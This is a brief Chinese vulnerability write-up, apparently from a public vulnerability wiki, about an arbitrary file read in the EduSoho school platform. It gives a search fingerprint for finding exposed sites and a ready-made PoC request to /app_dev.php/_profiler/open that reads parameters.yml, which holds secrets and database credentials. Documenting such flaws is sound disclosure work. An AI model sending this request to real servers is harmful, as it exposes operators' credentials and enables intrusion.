---
title: "EduSoho 教培系统 app_dev.php 任意读取漏洞"
date: 2026-10-16 09:07:33
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "EduSoho-教培系统"
tags:
  - "EduSoho-教培系统"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

EduSoho 教培系统是由杭州阔知网络科技研发的开源网校系统。

通过向 /app_dev.php/_profiler/open 端点发送可以读取到 app/config/parameters.yml 文件的内容，拿到该文件中保存的 secret 值以及数据库账号密码等敏感信息。

## 漏洞影响

EduSoho 教培系统

## 网络测绘

```
"Powered By EduSoho"
```

## 漏洞复现

登录页面

![image-20231115095857573](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115095857573.png)

指纹

![image-20231115095301932](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115095301932.png)

poc

```
GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1
Host:  
Accept: */*
Content-Type: application/x-www-form-urlencoded
```

![image-20231115095838331](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115095838331.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/EduSoho-%E6%95%99%E5%9F%B9%E7%B3%BB%E7%BB%9F-app_dev.php-%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
